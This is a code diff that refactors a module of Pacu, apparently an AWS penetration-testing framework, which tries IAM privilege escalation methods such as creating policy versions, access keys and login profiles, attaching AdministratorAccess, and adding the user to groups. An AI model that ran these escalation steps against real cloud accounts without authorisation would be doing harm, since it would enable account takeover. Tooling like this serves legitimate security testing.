@@ -2,13 +2,10 @@
 import argparse
 import boto3
 from copy import deepcopy
-from functools import partial
 import json
 import os
 import re
 import time
-
-from pacu import util
 
 
 module_info = {
@@ -122,15 +119,15 @@ def help():
 # 24) Modify existing Lambda function with higher privs than current user
 
 
-def main(args, database):
-    session = util.get_active_session(database)
+def main(args, pacu_main):
+    session = pacu_main.get_active_session()
 
     ###### Don't modify these. They can be removed if you are not using the function.
     args = parser.parse_args(args)
-    print = partial(util.print, session_name=session.name, database=database)
-    input = partial(util.input, session_name=session.name, database=database)
-    key_info = partial(util.key_info, database=database)
-    fetch_data = partial(util.fetch_data, database=database)
+    print = pacu_main.print
+    input = pacu_main.input
+    key_info = pacu_main.key_info
+    fetch_data = pacu_main.fetch_data
     ######
 
     all_perms = [
@@ -441,7 +438,7 @@ def main(args, database):
             print('Attempting confirmed privilege escalation methods...\n')
 
             for confirmed_method in checked_methods['Confirmed']:
-                response = methods[confirmed_method](database, print, input, fetch_data)
+                response = methods[confirmed_method](pacu_main, print, input, fetch_data)
 
                 if response is False:
                     print('  Method failed. Trying next potential method...')
@@ -459,7 +456,7 @@ def main(args, database):
             print('Attempting potential privilege escalation methods...')
 
             for potential_method in checked_methods['Potential']:
-                response = methods[potential_method](database, print, input, fetch_data)
+                response = methods[potential_method](pacu_main, print, input, fetch_data)
 
                 if response is False:
                     print('  Method failed. Trying next potential method...')
@@ -488,8 +485,8 @@ def remove_empty_from_dict(d):
 # Their names match their key names under the escalation_methods object so I can invoke a method by running globals()[method]()
 # Each of these will return True if successful and False is failed
 
-def CreateNewPolicyVersion(database, print, input, fetch_data):
-    session = util.get_active_session(database)
+def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
 
     print('  Starting method CreateNewPolicyVersion...\n')
     client = boto3.client(
@@ -504,7 +501,7 @@ def CreateNewPolicyVersion(database, print, input, fetch_data):
     if not policy_arn:
         print('    No policy ARN entered, now finding a valid policy...\n')
 
-        active_aws_key = session.get_active_aws_key(database)
+        active_aws_key = session.get_active_aws_key(pacu_main.database)
 
         if active_aws_key.policies:
             all_user_policies = active_aws_key.policies
@@ -575,7 +572,7 @@ def CreateNewPolicyVersion(database, print, input, fetch_data):
                 if fetch_data(None, 'confirm_permissions', '', force=True) is False:
                     print('Pre-req module not run successfully. Skipping method...')
                     return False
-                return CreateNewPolicyVersion(database, print, input, fetch_data)
+                return CreateNewPolicyVersion(pacu_main, print, input, fetch_data)
 
             else:  # It is an ARN
                 policy_arn = fetch
@@ -607,16 +604,16 @@ def CreateNewPolicyVersion(database, print, input, fetch_data):
         return False
 
 
-def SetExistingDefaultPolicyVersion(database, print, input, fetch_data):
+def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
     return
 
 
-def CreateEC2WithExistingIP(database, print, input, fetch_data):
+def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
     return
 
 
-def CreateAccessKey(database, print, input, fetch_data):
-    session = util.get_active_session(database)
+def CreateAccessKey(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
 
     print('  Starting method CreateAccessKey...')
 
@@ -650,14 +647,14 @@ def CreateAccessKey(database, print, input, fetch_data):
         again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
         if again.strip().lower() == 'y':
             print('      Re-running CreateAccessKey privilege escalation attempt...')
-            return CreateLoginProfile(database, print, input, fetch_data)
+            return CreateLoginProfile(pacu_main, print, input, fetch_data)
         else:
             return False
     return True
 
 
-def CreateLoginProfile(database, print, input, fetch_data):
-    session = util.get_active_session(database)
+def CreateLoginProfile(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
 
     print('  Starting method CreatingLoginProfile...')
 
@@ -699,14 +696,14 @@ def CreateLoginProfile(database, print, input, fetch_data):
         again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
         if again == 'y':
             print('      Re-running CreateLoginProfile privilege escalation attempt...')
-            return CreateLoginProfile(database, print, input, fetch_data)
+            return CreateLoginProfile(pacu_main, print, input, fetch_data)
         else:
             return False
     return True
 
 
-def UpdateLoginProfile(database, print, input, fetch_data):
-    session = util.get_active_session(database)
+def UpdateLoginProfile(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
 
     print('  Starting method UpdateLoginProfile...')
 
@@ -747,14 +744,14 @@ def UpdateLoginProfile(database, print, input, fetch_data):
         again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
         if again == 'y':
             print('      Re-running UpdateLoginProfile privilege escalation attempt...')
-            return UpdateLoginProfile(database, print, input, fetch_data)
+            return UpdateLoginProfile(pacu_main, print, input, fetch_data)
         else:
             return False
     return True
 
 
-def AttachUserPolicy(database, print, input, fetch_data):
-    session = util.get_active_session(database)
+def AttachUserPolicy(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
 
     print('  Starting method AttachUserPolicy...')
 
@@ -770,7 +767,7 @@ def AttachUserPolicy(database, print, input, fetch_data):
         policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
 
     try:
-        active_aws_key = session.get_active_aws_key(database)
+        active_aws_key = session.get_active_aws_key(pacu_main.database)
         response = client.attach_user_policy(
             UserName=active_aws_key['UserName'],
             policy_arn=policy_arn
@@ -782,28 +779,28 @@ def AttachUserPolicy(database, print, input, fetch_data):
         return False
 
 
-def AttachGroupPolicy(database, print, input, fetch_data):
+def AttachGroupPolicy(pacu_main, print, input, fetch_data):
     return
 
 
-def AttachRolePolicy(database, print, input, fetch_data):
+def AttachRolePolicy(pacu_main, print, input, fetch_data):
     return
 
 
-def PutUserPolicy(database, print, input, fetch_data):
+def PutUserPolicy(pacu_main, print, input, fetch_data):
     return
 
 
-def PutGroupPolicy(database, print, input, fetch_data):
+def PutGroupPolicy(pacu_main, print, input, fetch_data):
     return
 
 
-def PutRolePolicy(database, print, input, fetch_data):
+def PutRolePolicy(pacu_main, print, input, fetch_data):
     return
 
 
-def AddUserToGroup(database, print, input, fetch_data):
-    session = util.get_active_session(database)
+def AddUserToGroup(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
 
     print('  Starting method AddUserToGroup...')
 
@@ -831,7 +828,7 @@ def AddUserToGroup(database, print, input, fetch_data):
             group_name = groups[int(choice) - 1]['GroupName']
 
     try:
-        active_aws_key = session.get_active_aws_key(database)
+        active_aws_key = session.get_active_aws_key(pacu_main.database)
         response = client.add_user_to_group(
             GroupName=group_name,
             UserName=active_aws_key['UserName']
@@ -842,34 +839,34 @@ def AddUserToGroup(database, print, input, fetch_data):
         again = input('    Do you want to try again with a different group (y) or continue to the next privilege escalation method (n)? ')
         if again == 'y':
             print('      Re-running AddUserToGroup privilege escalation attempt...')
-            return AddUserToGroup(database, print, input, fetch_data)
+            return AddUserToGroup(pacu_main, print, input, fetch_data)
         else:
             return False
     return True
 
 
-def UpdateRolePolicyToAssumeIt(database, print, input, fetch_data):
+def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
     return
 
 
-def PassExistingRoleToNewLambdaThenInvoke(database, print, input, fetch_data):
+def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
     return
 
 
-def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(database, print, input, fetch_data):
+def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input, fetch_data):
     return
 
 
-def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(database, print, input, fetch_data):
+def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, input, fetch_data):
     return
 
 
-def PassExistingRoleToNewGlueDevEndpoint(database, print, input, fetch_data):
+def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
     return
 
 
-def UpdateExistingGlueDevEndpoint(database, print, input, fetch_data):
-    session = util.get_active_session(database)
+def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
 
     print('  Starting method UpdateExistingGlueDevEndpoint...')
 
@@ -916,19 +913,19 @@ def UpdateExistingGlueDevEndpoint(database, print, input, fetch_data):
         again = input('    Do you want to try again with a different development endpoint (y) or continue to the next privilege escalation method (n)? ')
         if again == 'y':
             print('      Re-running UpdateExistingGlueDevEndpoint privilege escalation attempt...')
-            return UpdateExistingGlueDevEndpoint(database, print, input, fetch_data)
+            return UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data)
         else:
             return False
     return True
 
 
-def PassExistingRoleToCloudFormation(database, print, input, fetch_data):
+def PassExistingRoleToCloudFormation(pacu_main, print, input, fetch_data):
     return
 
 
-def PassExistingRoleToNewDataPipeline(database, print, input, fetch_data):
+def PassExistingRoleToNewDataPipeline(pacu_main, print, input, fetch_data):
     return
 
 
-def EditExistingLambdaFunctionWithRole(database, print, input, fetch_data):
+def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
     return
